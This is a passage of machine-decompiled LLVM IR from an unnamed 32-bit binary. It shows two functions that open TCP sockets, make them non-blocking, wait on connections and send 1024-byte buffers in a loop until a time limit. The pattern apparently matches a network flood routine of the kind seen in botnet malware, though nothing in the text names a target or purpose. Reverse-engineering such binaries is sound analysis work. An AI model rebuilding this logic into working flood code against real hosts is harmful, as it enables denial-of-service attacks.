  %v2_dfd0 = ptrtoint i32* %stack_var_-212 to i32
  %v2_de54 = ptrtoint i32* %stack_var_-72 to i32
  %v8_e12c45 = icmp sgt i32 %v2_dc88, 1
  %v2_df20 = add i32 %v2_df1c, -176
  br label %dec_label_pc_e134

dec_label_pc_dda0:                                ; preds = %dec_label_pc_e124.preheader, %dec_label_pc_e118
  %storemerge248 = phi i32 [ %v1_e11c, %dec_label_pc_e118 ], [ 0, %dec_label_pc_e124.preheader ]
  store i32 %v3_dd20, i32* %r2.global-to-local, align 4
  %v3_ddac = mul i32 %storemerge248, 8
  %v2_ddb0 = add i32 %v3_ddac, %v3_dd20
  %v2_ddb4 = or i32 %v2_ddb0, 4
  %v1_ddb8 = inttoptr i32 %v2_ddb4 to i8*
  %v2_ddb8 = load i8, i8* %v1_ddb8, align 4
  %v6_ddc4 = icmp eq i8 %v2_ddb8, 0
  %v7_ddc4 = icmp eq i8 %v2_ddb8, 1
  br i1 %v7_ddc4, label %dec_label_pc_ded8.lr.ph, label %dec_label_pc_ddcc

dec_label_pc_ddcc:                                ; preds = %dec_label_pc_dda0
  %v7_ddd0 = icmp eq i8 %v2_ddb8, 2
  br i1 %v7_ddd0, label %dec_label_pc_e098, label %dec_label_pc_ddd8

dec_label_pc_ddd8:                                ; preds = %dec_label_pc_ddcc
  br i1 %v6_ddc4, label %dec_label_pc_dde8, label %dec_label_pc_e118

dec_label_pc_dde8:                                ; preds = %dec_label_pc_ddd8
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_ddf8 = call i32 @function_128b8(i32 2, i32 1, i32 0)
  %v5_de04 = mul i32 %storemerge248, 8
  %v6_de04 = add i32 %v5_de04, %v3_dd20
  %v7_de04 = inttoptr i32 %v6_de04 to i32*
  store i32 %v3_ddf8, i32* %v7_de04, align 8
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v6_de10 = inttoptr i32 %v2_ddb0 to i32*
  %v7_de10 = load i32, i32* %v6_de10, align 8
  store i32 %v7_de10, i32* @r4, align 4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_de1c = load i32, i32* %v6_de10, align 8
  store i32 %v7_de1c, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_de2c = call i32 @function_106d8(i32 %v7_de1c, i32 3)
  %v1_de34 = or i32 %v2_de2c, 2048
  store i32 %v1_de34, i32* @r3, align 4
  %v0_de38 = load i32, i32* @r4, align 4
  store i32 %v1_de34, i32* %r2.global-to-local, align 4
  %v2_de44 = call i32 @function_106d8(i32 %v0_de38, i32 4)
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_de50 = load i32, i32* %v6_de10, align 8
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_de64 = call i32 @function_12710(i32 %v7_de50, i32 %v2_de54, i32 16)
  %v3_de6c = icmp eq i32 %v3_de64, -1
  br i1 %v3_de6c, label %dec_label_pc_de74, label %dec_label_pc_de88

dec_label_pc_de74:                                ; preds = %dec_label_pc_dde8
  %v0_de74 = call i32 @function_1095c()
  %v1_de7c = inttoptr i32 %v0_de74 to i32*
  %v2_de7c = load i32, i32* %v1_de7c, align 4
  %v7_de80 = icmp eq i32 %v2_de7c, 115
  br i1 %v7_de80, label %dec_label_pc_dea0, label %dec_label_pc_de88

dec_label_pc_de88:                                ; preds = %dec_label_pc_dde8, %dec_label_pc_de74
  store i32 %v3_dd20, i32* %r2.global-to-local, align 4
  %v7_de90 = load i32, i32* %v6_de10, align 8
  %v1_de98 = call i32 @function_108d0(i32 %v7_de90)
  br label %dec_label_pc_e118

dec_label_pc_dea0:                                ; preds = %dec_label_pc_de74
  store i32 %v2_ddb4, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_ddb8, align 4
  br label %dec_label_pc_e118

dec_label_pc_ded8.lr.ph:                          ; preds = %dec_label_pc_dda0
  br label %dec_label_pc_ded8

dec_label_pc_ded8:                                ; preds = %dec_label_pc_ded8.lr.ph, %dec_label_pc_ded8
  %storemerge37 = phi i32 [ 0, %dec_label_pc_ded8.lr.ph ], [ %v1_deec, %dec_label_pc_ded8 ]
  store i32 %v2_dec4, i32* %r2.global-to-local, align 4
  %v5_dee4 = mul nuw nsw i32 %storemerge37, 4
  %v6_dee4 = add i32 %v5_dee4, %v2_dec4
  %v7_dee4 = inttoptr i32 %v6_dee4 to i32*
  store i32 0, i32* %v7_dee4, align 4
  %v1_deec = add nuw nsw i32 %storemerge37, 1
  %tmp39 = icmp ult i32 %v1_deec, 32
  br i1 %tmp39, label %dec_label_pc_ded8, label %dec_label_pc_df00

dec_label_pc_df00:                                ; preds = %dec_label_pc_ded8
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v6_df08 = inttoptr i32 %v2_ddb0 to i32*
  %v7_df08 = load i32, i32* %v6_df08, align 8
  %v3_df0c = udiv i32 %v7_df08, 32
  store i32 -176, i32* %r2.global-to-local, align 4
  %v3_df18 = mul nuw nsw i32 %v3_df0c, 4
  %v2_df24 = add i32 %v2_df20, %v3_df18
  %v1_df28 = inttoptr i32 %v2_df24 to i32*
  %v2_df28 = load i32, i32* %v1_df28, align 4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_df34 = load i32, i32* %v6_df08, align 8
  %v1_df38 = urem i32 %v7_df34, 32
  %v6_df40 = shl i32 1, %v1_df38
  %v2_df44 = or i32 %v6_df40, %v2_df28
  store i32 %v2_df44, i32* %v1_df28, align 4
  store i32 0, i32* %stack_var_-208, align 4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_df7c = load i32, i32* %v6_df08, align 8
  %v1_df80 = add i32 %v7_df7c, 1
  store i32 %v1_df80, i32* %r2.global-to-local, align 4
  %v1_df8c = load i32, i32* @sp, align 4
  %v2_df8c = inttoptr i32 %v1_df8c to i32*
  store i32 %v2_df88, i32* %v2_df8c, align 4
  %v0_df90 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_dec4, i32* %r2.global-to-local, align 4
  %v4_dfa0 = load i32, i32* %stack_var_-208, align 4
  %v5_dfa0 = call i32 @function_1059c(i32 %v0_df90, i32 0, i32 %v2_dec4, i32 0, i32 %v4_dfa0)
  %v7_dfb0 = icmp eq i32 %v5_dfa0, 1
  br i1 %v7_dfb0, label %dec_label_pc_dfb8, label %dec_label_pc_e054

dec_label_pc_dfb8:                                ; preds = %dec_label_pc_df00
  store i32 4, i32* %stack_var_-212, align 4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_dfc8 = load i32, i32* %v6_df08, align 8
  store i32 %v7_dfc8, i32* %r2.global-to-local, align 4
  %v1_dfd4 = load i32, i32* @sp, align 4
  %v2_dfd4 = inttoptr i32 %v1_dfd4 to i32*
  store i32 %v2_dfd0, i32* %v2_dfd4, align 4
  %v0_dfd8 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_dfe8 = load i32, i32* %stack_var_-212, align 4
  %v5_dfe8 = call i32 @function_12780(i32 %v0_dfd8, i32 1, i32 4, i32 %v2_dfcc, i32 %v4_dfe8)
  %v3_dfec = load i32, i32* %stack_var_-216, align 4
  %v2_dff0 = icmp eq i32 %v3_dfec, 0
  br i1 %v2_dff0, label %dec_label_pc_e030, label %dec_label_pc_dff8

dec_label_pc_dff8:                                ; preds = %dec_label_pc_dfb8
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_e000 = load i32, i32* %v6_df08, align 8
  %v1_e008 = call i32 @function_108d0(i32 %v7_e000)
  store i32 %v2_ddb4, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_ddb8, align 4
  br label %dec_label_pc_e118

dec_label_pc_e030:                                ; preds = %dec_label_pc_dfb8
  store i32 %v2_ddb4, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_ddb8, align 4
  br label %dec_label_pc_e118

dec_label_pc_e054:                                ; preds = %dec_label_pc_df00
  %v3_e058 = icmp eq i32 %v5_dfa0, -1
  br i1 %v3_e058, label %dec_label_pc_e060, label %dec_label_pc_e118

dec_label_pc_e060:                                ; preds = %dec_label_pc_e054
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_e068 = load i32, i32* %v6_df08, align 8
  %v1_e070 = call i32 @function_108d0(i32 %v7_e068)
  store i32 %v2_ddb4, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_ddb8, align 4
  br label %dec_label_pc_e118

dec_label_pc_e098:                                ; preds = %dec_label_pc_ddcc
  %v2_e0a0 = call i32 @function_9ae8(i32 %v1_dd5c, i32 1024)
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v6_e0ac = inttoptr i32 %v2_ddb0 to i32*
  %v7_e0ac = load i32, i32* %v6_e0ac, align 8
  store i32 1024, i32* %r2.global-to-local, align 4
  %v4_e0c0 = call i32 @function_127fc(i32 %v7_e0ac, i32 %v1_dd5c, i32 1024, i32 16384)
  %v3_e0c8 = icmp eq i32 %v4_e0c0, -1
  br i1 %v3_e0c8, label %dec_label_pc_e0d0, label %dec_label_pc_e118

dec_label_pc_e0d0:                                ; preds = %dec_label_pc_e098
  %v0_e0d0 = call i32 @function_1095c()
  %v1_e0d8 = inttoptr i32 %v0_e0d0 to i32*
  %v2_e0d8 = load i32, i32* %v1_e0d8, align 4
  %v7_e0dc = icmp eq i32 %v2_e0d8, 11
  br i1 %v7_e0dc, label %dec_label_pc_e118, label %dec_label_pc_e0e4

dec_label_pc_e0e4:                                ; preds = %dec_label_pc_e0d0
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_e0ec = load i32, i32* %v6_e0ac, align 8
  %v1_e0f4 = call i32 @function_108d0(i32 %v7_e0ec)
  store i32 %v2_ddb4, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_ddb8, align 4
  br label %dec_label_pc_e118

dec_label_pc_e118:                                ; preds = %dec_label_pc_ddd8, %dec_label_pc_e054, %dec_label_pc_e098, %dec_label_pc_e0d0, %dec_label_pc_e060, %dec_label_pc_e030, %dec_label_pc_dff8, %dec_label_pc_dea0, %dec_label_pc_de88, %dec_label_pc_e0e4
  %v1_e11c = add nuw nsw i32 %storemerge248, 1
  store i32 %v1_e11c, i32* %r2.global-to-local, align 4
  %v5_e130 = icmp slt i32 %v1_e11c, %v3_dc8c
  br i1 %v5_e130, label %dec_label_pc_dda0, label %dec_label_pc_e134

dec_label_pc_e134:                                ; preds = %dec_label_pc_e124.preheader, %dec_label_pc_e118, %dec_label_pc_dcdc
  %v2_e138 = call i32 @function_1051c(i32* null)
  store i32 %v2_e138, i32* %r2.global-to-local, align 4
  %v5_e148 = icmp slt i32 %v2_e138, %v2_dd88
  br i1 %v5_e148, label %dec_label_pc_e124.preheader, label %dec_label_pc_e14c

dec_label_pc_e124.preheader:                      ; preds = %dec_label_pc_e134
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_e12c45, label %dec_label_pc_dda0, label %dec_label_pc_e134

dec_label_pc_e14c:                                ; preds = %dec_label_pc_e134, %dec_label_pc_dc58
  %v1_e158 = phi i32 [ %v3_dcc8, %dec_label_pc_dc58 ], [ %v2_e138, %dec_label_pc_e134 ]
  ret i32 %v1_e158

; uselistorder directives
  uselistorder i32 %v1_e11c, { 2, 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i8* %v1_ddb8, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_ddb4, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_ddb0, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge248, { 1, 9, 8, 7, 6, 5, 4, 3, 2, 12, 11, 10, 0, 13 }
  uselistorder i32 %v2_dec4, { 3, 2, 0, 1 }
  uselistorder i32 %v3_dd20, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_dc8c, { 1, 2, 0 }
  uselistorder i32 %v0_dc7c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 36, 33, 32, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_127fc, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_9ae8, { 2, 1, 0 }
  uselistorder i32 -176, { 1, 0 }
  uselistorder label %dec_label_pc_e118, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_ded8, { 1, 0 }
  uselistorder label %dec_label_pc_de88, { 1, 0 }
}

define i32 @function_e15c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_e15c:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 57704, i32* %stack_var_-4, align 4
  %v2_e164 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e164, i32* @fp, align 4
  %v0_e180 = call i32 @function_10644()
  store i32 %v0_e180, i32* %r2.global-to-local, align 4
  %tmp = icmp slt i32 %v0_e180, 0
  %v3_e188 = zext i1 %tmp to i32
  %v2_e18c = add i32 %v3_e188, %v0_e180
  %v3_e190 = sdiv i32 %v2_e18c, 2
  store i32 2, i32* %stack_var_-80, align 4
  %v3_e1a8 = urem i32 %arg2, 65536
  %v1_e1b0 = call i32 @function_125e0(i32 %v3_e1a8)
  %v3_e1cc = call i32 @function_96fc(i32 %arg1, i32* nonnull %stack_var_-76)
  %v2_e1d4 = icmp eq i32 %v3_e1cc, 0
  br i1 %v2_e1d4, label %dec_label_pc_e1e0, label %dec_label_pc_e6f8

dec_label_pc_e1e0:                                ; preds = %dec_label_pc_e15c
  store i32 8, i32* @r2, align 4
  %v2_e1f4 = bitcast i32* %stack_var_-72 to i8*
  %v3_e1f4 = call i32 @function_11f30(i8* %v2_e1f4, i32 0)
  %v3_e1fc = mul i32 %v3_e190, 8
  %v1_e200 = or i32 %v3_e1fc, 7
  %v1_e204 = add i32 %v1_e200, 7
  %v3_e208 = and i32 %v1_e204, -8
  %v1_e210 = load i32, i32* @sp, align 4
  %v2_e210 = sub i32 %v1_e210, %v3_e208
  %v1_e220 = add i32 %v2_e210, 15
  %v3_e224 = and i32 %v1_e220, -8
  %v2_e248 = mul i32 %v3_e190, 5
  store i32 %v2_e248, i32* @r2, align 4
  %v2_e258 = inttoptr i32 %v3_e224 to i8*
  %v3_e258 = call i32 @function_11f30(i8* %v2_e258, i32 0)
  %v1_e260 = call i32 @function_12b00(i32 1024)
  store i32 1024, i32* @r2, align 4
  %v2_e278 = inttoptr i32 %v1_e260 to i8*
  %v3_e278 = call i32 @function_11f30(i8* %v2_e278, i32 0)
  %v2_e280 = call i32 @function_1051c(i32* null)
  store i32 %v2_e280, i32* %r2.global-to-local, align 4
  %v2_e28c = add i32 %v2_e280, %arg3
  %v2_e3c8 = ptrtoint i32* %stack_var_-208 to i32
  %v2_e420 = ptrtoint i32* %stack_var_-24 to i32
  %v2_e48c = ptrtoint i32* %stack_var_-216 to i32
  %v2_e4d0 = ptrtoint i32* %stack_var_-224 to i32
  %v2_e4d4 = ptrtoint i32* %stack_var_-220 to i32
  %v2_e358 = ptrtoint i32* %stack_var_-80 to i32
  %v8_e6d854 = icmp sgt i32 %v2_e18c, 1
  %v2_e424 = add i32 %v2_e420, -184
  br label %dec_label_pc_e6e0

dec_label_pc_e2a4:                                ; preds = %dec_label_pc_e6d0.preheader, %dec_label_pc_e6c4
  %storemerge357 = phi i32 [ %v1_e6c8, %dec_label_pc_e6c4 ], [ 0, %dec_label_pc_e6d0.preheader ]
  store i32 %v3_e224, i32* %r2.global-to-local, align 4
  %v3_e2b0 = mul i32 %storemerge357, 8
  %v2_e2b4 = add i32 %v3_e2b0, %v3_e224
  %v2_e2b8 = or i32 %v2_e2b4, 4
  %v1_e2bc = inttoptr i32 %v2_e2b8 to i8*
  %v2_e2bc = load i8, i8* %v1_e2bc, align 4
  %v6_e2c8 = icmp eq i8 %v2_e2bc, 0
  %v7_e2c8 = icmp eq i8 %v2_e2bc, 1
  br i1 %v7_e2c8, label %dec_label_pc_e3dc.lr.ph, label %dec_label_pc_e2d0

dec_label_pc_e2d0:                                ; preds = %dec_label_pc_e2a4
  %v7_e2d4 = icmp eq i8 %v2_e2bc, 2
  br i1 %v7_e2d4, label %dec_label_pc_e5b0.lr.ph, label %dec_label_pc_e2dc

dec_label_pc_e2dc:                                ; preds = %dec_label_pc_e2d0
  br i1 %v6_e2c8, label %dec_label_pc_e2ec, label %dec_label_pc_e6c4

dec_label_pc_e2ec:                                ; preds = %dec_label_pc_e2dc
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e2fc = call i32 @function_128b8(i32 2, i32 1, i32 0)
  %v5_e308 = mul i32 %storemerge357, 8
  %v6_e308 = add i32 %v5_e308, %v3_e224
  %v7_e308 = inttoptr i32 %v6_e308 to i32*
  store i32 %v3_e2fc, i32* %v7_e308, align 8
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v6_e314 = inttoptr i32 %v2_e2b4 to i32*
  %v7_e314 = load i32, i32* %v6_e314, align 8
  store i32 %v7_e314, i32* @r4, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_e320 = load i32, i32* %v6_e314, align 8
  store i32 %v7_e320, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e330 = call i32 @function_106d8(i32 %v7_e320, i32 3)
  %v1_e338 = or i32 %v2_e330, 2048
  store i32 %v1_e338, i32* @r3, align 4
  %v0_e33c = load i32, i32* @r4, align 4
  store i32 %v1_e338, i32* %r2.global-to-local, align 4
  %v2_e348 = call i32 @function_106d8(i32 %v0_e33c, i32 4)
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_e354 = load i32, i32* %v6_e314, align 8
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e368 = call i32 @function_12710(i32 %v7_e354, i32 %v2_e358, i32 16)
  %v3_e370 = icmp eq i32 %v3_e368, -1
  br i1 %v3_e370, label %dec_label_pc_e378, label %dec_label_pc_e38c

dec_label_pc_e378:                                ; preds = %dec_label_pc_e2ec
  %v0_e378 = call i32 @function_1095c()
  %v1_e380 = inttoptr i32 %v0_e378 to i32*
  %v2_e380 = load i32, i32* %v1_e380, align 4
  %v7_e384 = icmp eq i32 %v2_e380, 115
  br i1 %v7_e384, label %dec_label_pc_e3a4, label %dec_label_pc_e38c

dec_label_pc_e38c:                                ; preds = %dec_label_pc_e2ec, %dec_label_pc_e378
  store i32 %v3_e224, i32* %r2.global-to-local, align 4
  %v7_e394 = load i32, i32* %v6_e314, align 8
  %v1_e39c = call i32 @function_108d0(i32 %v7_e394)
  br label %dec_label_pc_e6c4

dec_label_pc_e3a4:                                ; preds = %dec_label_pc_e378
  store i32 %v2_e2b8, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_e2bc, align 4
  br label %dec_label_pc_e6c4

dec_label_pc_e3dc.lr.ph:                          ; preds = %dec_label_pc_e2a4
  br label %dec_label_pc_e3dc

dec_label_pc_e3dc:                                ; preds = %dec_label_pc_e3dc.lr.ph, %dec_label_pc_e3dc
  %storemerge513 = phi i32 [ 0, %dec_label_pc_e3dc.lr.ph ], [ %v1_e3f0, %dec_label_pc_e3dc ]
  store i32 %v2_e3c8, i32* %r2.global-to-local, align 4
  %v5_e3e8 = mul nuw nsw i32 %storemerge513, 4
  %v6_e3e8 = add i32 %v5_e3e8, %v2_e3c8
  %v7_e3e8 = inttoptr i32 %v6_e3e8 to i32*
  store i32 0, i32* %v7_e3e8, align 4
  %v1_e3f0 = add nuw nsw i32 %storemerge513, 1
  %tmp47 = icmp ult i32 %v1_e3f0, 32
  br i1 %tmp47, label %dec_label_pc_e3dc, label %dec_label_pc_e404

dec_label_pc_e404:                                ; preds = %dec_label_pc_e3dc
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v6_e40c = inttoptr i32 %v2_e2b4 to i32*
  %v7_e40c = load i32, i32* %v6_e40c, align 8
  %v3_e410 = udiv i32 %v7_e40c, 32
  store i32 -184, i32* %r2.global-to-local, align 4
  %v3_e41c = mul nuw nsw i32 %v3_e410, 4
  %v2_e428 = add i32 %v2_e424, %v3_e41c
  %v1_e42c = inttoptr i32 %v2_e428 to i32*
  %v2_e42c = load i32, i32* %v1_e42c, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_e438 = load i32, i32* %v6_e40c, align 8
  %v1_e43c = urem i32 %v7_e438, 32
  %v6_e444 = shl i32 1, %v1_e43c
  %v2_e448 = or i32 %v6_e444, %v2_e42c
  store i32 %v2_e448, i32* %v1_e42c, align 4
  store i32 0, i32* %stack_var_-216, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_e480 = load i32, i32* %v6_e40c, align 8
  %v1_e484 = add i32 %v7_e480, 1
  store i32 %v1_e484, i32* %r2.global-to-local, align 4
  %v1_e490 = load i32, i32* @sp, align 4
  %v2_e490 = inttoptr i32 %v1_e490 to i32*
  store i32 %v2_e48c, i32* %v2_e490, align 4
  %v0_e494 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_e3c8, i32* %r2.global-to-local, align 4
  %v4_e4a4 = load i32, i32* %stack_var_-216, align 4
  %v5_e4a4 = call i32 @function_1059c(i32 %v0_e494, i32 0, i32 %v2_e3c8, i32 0, i32 %v4_e4a4)
  %v7_e4b4 = icmp eq i32 %v5_e4a4, 1
  br i1 %v7_e4b4, label %dec_label_pc_e4bc, label %dec_label_pc_e558

dec_label_pc_e4bc:                                ; preds = %dec_label_pc_e404
  store i32 4, i32* %stack_var_-220, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_e4cc = load i32, i32* %v6_e40c, align 8
  store i32 %v7_e4cc, i32* %r2.global-to-local, align 4
  %v1_e4d8 = load i32, i32* @sp, align 4
  %v2_e4d8 = inttoptr i32 %v1_e4d8 to i32*
  store i32 %v2_e4d4, i32* %v2_e4d8, align 4
  %v0_e4dc = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_e4ec = load i32, i32* %stack_var_-220, align 4
  %v5_e4ec = call i32 @function_12780(i32 %v0_e4dc, i32 1, i32 4, i32 %v2_e4d0, i32 %v4_e4ec)
  %v3_e4f0 = load i32, i32* %stack_var_-224, align 4
  %v2_e4f4 = icmp eq i32 %v3_e4f0, 0
  br i1 %v2_e4f4, label %dec_label_pc_e534, label %dec_label_pc_e4fc

dec_label_pc_e4fc:                                ; preds = %dec_label_pc_e4bc
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_e504 = load i32, i32* %v6_e40c, align 8
  %v1_e50c = call i32 @function_108d0(i32 %v7_e504)
  store i32 %v2_e2b8, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_e2bc, align 4
  br label %dec_label_pc_e6c4

dec_label_pc_e534:                                ; preds = %dec_label_pc_e4bc
  store i32 %v2_e2b8, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_e2bc, align 4
  br label %dec_label_pc_e6c4

dec_label_pc_e558:                                ; preds = %dec_label_pc_e404
  %v3_e55c = icmp eq i32 %v5_e4a4, -1
  br i1 %v3_e55c, label %dec_label_pc_e564, label %dec_label_pc_e6c4

dec_label_pc_e564:                                ; preds = %dec_label_pc_e558
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_e56c = load i32, i32* %v6_e40c, align 8
  %v1_e574 = call i32 @function_108d0(i32 %v7_e56c)
  store i32 %v2_e2b8, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_e2bc, align 4
  br label %dec_label_pc_e6c4

dec_label_pc_e5b0.lr.ph:                          ; preds = %dec_label_pc_e2d0
  br label %dec_label_pc_e5b0

dec_label_pc_e5b0:                                ; preds = %dec_label_pc_e5b0.lr.ph, %dec_label_pc_e5b0
  %storemerge49 = phi i32 [ 0, %dec_label_pc_e5b0.lr.ph ], [ %v1_e5c4, %dec_label_pc_e5b0 ]
  store i32 %v2_e3c8, i32* %r2.global-to-local, align 4
  %v5_e5bc = mul nuw nsw i32 %storemerge49, 4
  %v6_e5bc = add i32 %v5_e5bc, %v2_e3c8
  %v7_e5bc = inttoptr i32 %v6_e5bc to i32*
  store i32 0, i32* %v7_e5bc, align 4
  %v1_e5c4 = add nuw nsw i32 %storemerge49, 1
  %tmp48 = icmp ult i32 %v1_e5c4, 32
  br i1 %tmp48, label %dec_label_pc_e5b0, label %dec_label_pc_e5d8

dec_label_pc_e5d8:                                ; preds = %dec_label_pc_e5b0
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v6_e5e0 = inttoptr i32 %v2_e2b4 to i32*
  %v7_e5e0 = load i32, i32* %v6_e5e0, align 8
  %v3_e5e4 = udiv i32 %v7_e5e0, 32
  store i32 -184, i32* %r2.global-to-local, align 4
  %v3_e5f0 = mul nuw nsw i32 %v3_e5e4, 4
  %v2_e5fc = add i32 %v2_e424, %v3_e5f0
  %v1_e600 = inttoptr i32 %v2_e5fc to i32*
  %v2_e600 = load i32, i32* %v1_e600, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_e60c = load i32, i32* %v6_e5e0, align 8
  %v1_e610 = urem i32 %v7_e60c, 32
  %v6_e618 = shl i32 1, %v1_e610
  %v2_e61c = or i32 %v6_e618, %v2_e600
  store i32 %v2_e61c, i32* %v1_e600, align 4
  store i32 0, i32* %stack_var_-216, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_e654 = load i32, i32* %v6_e5e0, align 8
  %v1_e658 = add i32 %v7_e654, 1
  store i32 %v1_e658, i32* %r2.global-to-local, align 4
  %v1_e664 = load i32, i32* @sp, align 4
  %v2_e664 = inttoptr i32 %v1_e664 to i32*
  store i32 %v2_e48c, i32* %v2_e664, align 4
  %v0_e668 = load i32, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_e678 = load i32, i32* %stack_var_-216, align 4
  %v5_e678 = call i32 @function_1059c(i32 %v0_e668, i32 0, i32 0, i32 %v2_e3c8, i32 %v4_e678)
  %v2_e688 = icmp eq i32 %v5_e678, 0
  br i1 %v2_e688, label %dec_label_pc_e6c4, label %dec_label_pc_e690

dec_label_pc_e690:                                ; preds = %dec_label_pc_e5d8
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_e698 = load i32, i32* %v6_e5e0, align 8
  %v1_e6a0 = call i32 @function_108d0(i32 %v7_e698)
  store i32 %v2_e2b8, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_e2bc, align 4
  br label %dec_label_pc_e6c4

dec_label_pc_e6c4:                                ; preds = %dec_label_pc_e2dc, %dec_label_pc_e558, %dec_label_pc_e5d8, %dec_label_pc_e564, %dec_label_pc_e534, %dec_label_pc_e4fc, %dec_label_pc_e3a4, %dec_label_pc_e38c, %dec_label_pc_e690
  %v1_e6c8 = add nuw nsw i32 %storemerge357, 1
  store i32 %v1_e6c8, i32* %r2.global-to-local, align 4
  %v5_e6dc = icmp slt i32 %v1_e6c8, %v3_e190
  br i1 %v5_e6dc, label %dec_label_pc_e2a4, label %dec_label_pc_e6e0

dec_label_pc_e6e0:                                ; preds = %dec_label_pc_e6d0.preheader, %dec_label_pc_e6c4, %dec_label_pc_e1e0
  %v2_e6e4 = call i32 @function_1051c(i32* null)
  store i32 %v2_e6e4, i32* %r2.global-to-local, align 4
  %v5_e6f4 = icmp slt i32 %v2_e6e4, %v2_e28c
  br i1 %v5_e6f4, label %dec_label_pc_e6d0.preheader, label %dec_label_pc_e6f8

dec_label_pc_e6d0.preheader:                      ; preds = %dec_label_pc_e6e0
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_e6d854, label %dec_label_pc_e2a4, label %dec_label_pc_e6e0

dec_label_pc_e6f8:                                ; preds = %dec_label_pc_e6e0, %dec_label_pc_e15c
  %v1_e704 = phi i32 [ %v3_e1cc, %dec_label_pc_e15c ], [ %v2_e6e4, %dec_label_pc_e6e0 ]
  ret i32 %v1_e704

; uselistorder directives
  uselistorder i32 %v1_e6c8, { 2, 1, 0 }
  uselistorder i32 %storemerge49, { 1, 0 }
  uselistorder i32 %storemerge513, { 1, 0 }
  uselistorder i8* %v1_e2bc, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_e2b8, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_e2b4, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge357, { 1, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 14, 13, 12, 0, 15 }
  uselistorder i32 %v2_e3c8, { 2, 0, 3, 6, 5, 1, 4 }
  uselistorder i32 %v3_e224, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_e190, { 1, 2, 0 }
  uselistorder i32 %v0_e180, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-216, { 0, 2, 1, 3, 4 }
